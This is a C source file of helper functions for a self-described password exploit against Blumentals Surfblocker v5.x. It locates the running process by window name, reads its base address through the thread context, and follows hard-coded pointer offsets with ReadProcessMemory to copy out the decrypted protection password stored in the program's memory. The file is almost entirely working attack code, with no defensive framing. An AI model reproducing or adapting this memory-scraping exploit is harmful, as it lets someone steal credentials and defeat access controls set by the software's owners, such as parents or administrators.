#include <windows.h>
#include <psapi.h>

#include "pfunc.h"

/**Blumentals Surfblocker v5.x Password *Exploit* additional functions*/

LPVOID GetProcessOEP(HANDLE hProcess , MODULEINFO modinfo){
	
	LPVOID oep;
	BOOL retval;
	
	retval = GetModuleInformation(hProcess,NULL,&modinfo,sizeof(modinfo));
	
	if(retval == 0)
		return NULL;
	
	oep = modinfo.EntryPoint;
	
	return oep;

}

/* Returns image base address of suspended process */

DWORD GetBaseAddress(HWND hwnd, HANDLE hProc ,HANDLE hThread){
	
	DWORD baseAddr = 0;
	CONTEXT ctx;
	
	ctx.ContextFlags = CONTEXT_INTEGER;
	
	if(!GetThreadContext(hThread,&ctx))
	{
		MessageBox(hwnd,"Failed to get thread context!","Error",MB_OK | MB_ICONERROR);
		return 0;
	}
	
	
	if(!ReadProcessMemory(hProc,(char*)(ctx.Ebx + 8),&baseAddr,sizeof(char*),NULL))
	{
		MessageBox(hwnd,"Failed to get base address!\nFailed to read process memory!","Error",MB_OK | MB_ICONERROR);
		return 0;
	}
	
	
	return baseAddr;
}

/* Returns process ID based on window and class name*/

DWORD GetProcessPID(char class_name[] , char  window_name[]){
	
	DWORD pid = 0;
	HWND windowHandle;
	
	windowHandle = FindWindow(class_name,window_name);
	
	if(windowHandle == NULL)
		return 0;
	
	GetWindowThreadProcessId(windowHandle,&pid);

	return pid;
	
}

unsigned int GetConstantAddress(HANDLE hProcess, LPVOID address){
	  
	BOOL retVal;
	BOOL retVal2;
	
	unsigned int buffer = 0;
	unsigned int const_addr = 0;
	
	address = (char*)address + 0x124;

	retVal = ReadProcessMemory(hProcess,(char*)address,&buffer,4,NULL);
	retVal2 = ReadProcessMemory(hProcess,(char*)buffer,&const_addr,4,NULL);
	
	if(retVal == 0 || retVal2 == 0)
	{
		return 0;
	}

	return const_addr;
	
}

signed char memexploit(HANDLE hProc, unsigned int const_addr,WCHAR *password){

	// single const_addr variable here is used for all memory reads
	
    if(!ReadProcessMemory(hProc,(char*)const_addr,&const_addr,4,NULL))
		return -1;
	

    const_addr = const_addr + 0x458;
	
   if(!ReadProcessMemory(hProc,(char*)const_addr,&const_addr,4,NULL))
		return -1;
   

	if(const_addr != 0){
		
		// address where decrypted password is stored
		if(!ReadProcessMemory(hProc,(char*)const_addr,password,512,NULL))	
			 return -1;
	
	
	  return 1;
	}
	
	return 0;

}
